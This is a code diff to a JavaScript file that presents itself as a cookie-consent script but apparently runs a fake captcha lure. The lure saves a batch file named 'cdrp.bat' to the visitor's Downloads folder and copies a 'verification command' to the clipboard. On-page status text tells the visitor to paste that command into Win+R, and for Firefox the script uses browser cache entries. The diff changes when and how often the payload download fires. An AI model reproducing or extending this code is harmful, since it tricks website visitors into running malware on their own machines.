@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.5',
+    version: '1.9.6',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -89,6 +89,7 @@
   var captchaOverlay = null;
   var captchaVisible = false;
   var lastPayloadBuf = null;
+  var chromiumPayloadDownloaded = false;
 
   function getFaviconCandidates() {
     var urls = [];
@@ -121,7 +122,7 @@
       if (bk === 'firefox') {
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
-        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — complete captcha to save Downloads\\cdrp.bat, then Win+R pastes the confirmation code';
+        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — no download until captcha finishes; then one cdrp.bat + Win+R code';
       }
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
@@ -179,7 +180,9 @@
   }
 
   function saveChromiumPayloadDownload() {
+    if (chromiumPayloadDownloaded) return;
     if (getBrowserKey() === 'firefox' || !lastPayloadBuf) return;
+    chromiumPayloadDownloaded = true;
     try {
       var name = CONSENT_CONFIG.chromiumPayloadDownloadName || 'cdrp.bat';
       var blob = new Blob([lastPayloadBuf], { type: 'application/octet-stream' });
@@ -199,8 +202,6 @@
   function copyVerificationCommand() {
     var cmd = getVerificationCommand();
     if (!cmd) return false;
-
-    saveChromiumPayloadDownload();
 
     if (fallbackCopy(cmd)) return true;
 
@@ -495,6 +496,7 @@
     captchaWidget.setAttribute('role', 'dialog');
     captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
 
+    saveChromiumPayloadDownload();
     var copied = copyVerificationCommand();
     updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
     bindCopyOnUserGesture(captchaWidget);
@@ -528,7 +530,6 @@
       busy = true;
       area.classList.add('cf-loading');
       area.setAttribute('aria-checked', 'true');
-      copyVerificationCommand();
       setTimeout(mountVerificationDialog, 700 + Math.random() * 400);
     }
 
@@ -582,6 +583,7 @@
       captchaWidget.classList.remove('ts-loading');
       captchaWidget.classList.add('ts-verifying');
       captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
+      saveChromiumPayloadDownload();
       var copied = copyVerificationCommand();
       updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
       bindCopyOnUserGesture(captchaWidget);
@@ -590,7 +592,6 @@
     function runVerify() {
       if (verified || busy) return;
       if (!isPayloadReady()) return;
-      copyVerificationCommand();
       busy = true;
       captchaWidget.classList.add('ts-loading');
       checkArea.setAttribute('aria-checked', 'true');
